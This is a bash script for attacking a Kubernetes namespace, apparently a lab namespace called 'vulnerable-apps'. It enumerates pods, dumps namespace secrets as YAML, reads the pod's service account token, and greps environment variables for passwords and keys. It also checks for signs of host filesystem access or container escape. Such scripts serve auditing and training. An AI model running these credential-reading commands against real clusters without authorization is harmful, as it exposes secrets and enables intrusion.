#!/bin/bash

# Script to exploit vulnerabilities in Kubernetes cluster

set -eo pipefail

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"

echo -e "${BLUE}=== Exploiting Vulnerabilities in Kubernetes ===${NC}\n"
echo -e "${YELLOW}Namespace: $NAMESPACE${NC}\n"

# 1. List pods in namespace
echo -e "${YELLOW}[1] Listing pods in namespace $NAMESPACE...${NC}"
kubectl get pods -n "$NAMESPACE"
PODS=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}')

if [ -z "$PODS" ]; then
    echo -e "${RED}✗ No pods found${NC}"
    exit 1
fi

# 2. Select first pod
FIRST_POD=$(echo $PODS | cut -d' ' -f1)
echo -e "${GREEN}✓ Using pod: $FIRST_POD${NC}"

# 3. Check if pod has privileges
echo -e "\n${YELLOW}[2] Verifying pod security context...${NC}"
kubectl get pod "$FIRST_POD" -n "$NAMESPACE" -o json | \
    jq -r '.spec.containers[0].securityContext' 2>/dev/null || \
    kubectl describe pod "$FIRST_POD" -n "$NAMESPACE" | grep -i "security\|privileged\|runAsUser"

# 4. Try to execute commands in pod
echo -e "\n${YELLOW}[3] Attempting to execute commands in pod...${NC}"
if kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- id 2>/dev/null; then
    echo -e "${GREEN}✓ Command execution successful${NC}"
else
    echo -e "${RED}✗ Could not execute commands${NC}"
fi

# 5. Check if we can read secrets
echo -e "\n${YELLOW}[4] Attempting to read namespace secrets...${NC}"
SECRETS=$(kubectl get secrets -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null)
if [ -n "$SECRETS" ]; then
    for SECRET in $SECRETS; do
        echo -e "${YELLOW}   Secret: $SECRET${NC}"
        kubectl get secret "$SECRET" -n "$NAMESPACE" -o yaml 2>/dev/null | head -20
    done
    echo -e "${GREEN}✓ Secrets accessible${NC}"
else
    echo -e "${RED}✗ No secrets found${NC}"
fi

# 6. Check volume mounts
echo -e "\n${YELLOW}[5] Verifying volume mounts...${NC}"
kubectl describe pod "$FIRST_POD" -n "$NAMESPACE" | grep -i "mount\|volume" || \
    echo -e "${YELLOW}   Review manually${NC}"

# 7. Try to access host filesystem
echo -e "\n${YELLOW}[6] Verifying host filesystem access...${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- ls -la /host 2>/dev/null || \
    kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- mount | grep -i host || \
    echo -e "${YELLOW}   No direct host access found${NC}"

# 8. Search for service tokens
echo -e "\n${YELLOW}[7] Searching for service account tokens...${NC}"
if kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; then
    echo -e "${GREEN}✓ Service account token found${NC}"
else
    echo -e "${RED}✗ Could not read token${NC}"
fi

# 9. Check environment variables
echo -e "\n${YELLOW}[8] Verifying pod environment variables...${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- env 2>/dev/null | grep -i "password\|secret\|key\|token" || \
    echo -e "${YELLOW}   No sensitive variables found${NC}"

# 10. Try container escape (if possible)
echo -e "\n${YELLOW}[9] Verifying container escape possibilities...${NC}"
if kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- ls -la /dev/kmsg 2>/dev/null; then
    echo -e "${GREEN}⚠ /dev/kmsg accessible (possible container escape)${NC}"
else
    echo -e "${YELLOW}   /dev/kmsg not accessible${NC}"
fi

if kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- cat /proc/self/status 2>/dev/null | grep -i "cap"; then
    :
else
    echo -e "${YELLOW}   Review capabilities manually${NC}"
fi

echo -e "\n${BLUE}=== Kubernetes Exploitation Completed ===${NC}"
